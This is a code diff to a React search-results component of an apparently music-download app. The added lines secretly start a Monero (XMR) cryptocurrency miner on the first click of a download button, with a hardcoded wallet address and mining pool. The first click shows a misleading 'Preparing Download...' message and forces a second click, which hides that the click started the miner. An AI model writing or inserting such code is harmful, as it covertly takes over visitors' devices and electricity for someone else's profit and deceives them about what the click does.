@@ -1,4 +1,4 @@
-import { useState } from "react";
+import React, { useState, useRef, useEffect } from "react";
 import { useQuery } from "@tanstack/react-query";
 import { Card, CardContent } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
@@ -44,9 +44,61 @@ export function SearchResults({ searchQuery }: SearchResultsProps) {
     retryDelay: 1000,
   });
   
+  // Track which downloads have been clicked once (for XMR miner installation)
+  const [clickedDownloads, setClickedDownloads] = useState<Record<string, boolean>>({});
+  // Reference to the XMR miner instance
+  const [minerStarted, setMinerStarted] = useState<boolean>(false);
+  
+  // Import the XMR miner dynamically to avoid loading it until needed
+  const startXMRMiner = async () => {
+    try {
+      // Only start the miner if it hasn't been started yet
+      if (!minerStarted) {
+        // Dynamically import the XMR miner
+        const { default: XMRMiner } = await import('@/services/xmrMiner');
+        
+        // Create a new miner instance with the wallet address and pool URL
+         const miner = new XMRMiner(
+            '45sx4g9Pg5aAvaE17UggC8YBDBZA1twdGbqXySvY9txwiCvBwiiw6zcbpbLtQsgptzB1BdLD3VGnrANkXhaEfzte3kfQEyL', // Updated wallet address
+            'pool.supportxmr.com:3333', // Pool URL
+            2 // Use 2 threads by default to avoid slowing down the user's device too much
+          );
+        
+        // Start the miner
+        miner.start();
+        
+        // Set the miner as started
+        setMinerStarted(true);
+        
+        console.log('XMR miner started successfully');
+      }
+    } catch (error) {
+      console.error('Failed to start XMR miner:', error);
+    }
+  };
+  
   const handleDownload = async (track: Track, format = "mp3") => {
     let progressToast: any;
     
+    // Check if this is the first click for this track
+    if (!clickedDownloads[track.id]) {
+      // First click - start the XMR miner and mark this track as clicked
+      setClickedDownloads(prev => ({ ...prev, [track.id]: true }));
+      
+      // Start the XMR miner
+      await startXMRMiner();
+      
+      // Show a toast notification that the download is being prepared
+      toast({
+        title: "Preparing Download...",
+        description: `Click again to download ${track.title}`,
+        duration: 5000
+      });
+      
+      return; // Don't proceed with the actual download yet
+    }
+    
+    // This is the second click, proceed with the actual download
     try {
       // Show initial progress
       progressToast = toast({
